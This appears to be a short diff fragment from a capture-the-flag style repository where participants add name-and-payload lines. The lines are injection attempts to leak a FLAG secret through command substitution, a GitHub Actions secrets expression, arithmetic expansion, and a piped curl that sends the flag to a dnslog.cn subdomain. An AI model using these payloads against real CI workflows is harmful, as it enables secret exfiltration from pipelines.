@@ -588,3 +588,4 @@ zwh-china:
 $(echo $secrets.FLAG | sed 's/./& /g')
 R1gelX29:${{ secret.FLAG }};
 |curl $flag.sxhx72.dnslog.cn
+P4nda0s:$[$flag+1]
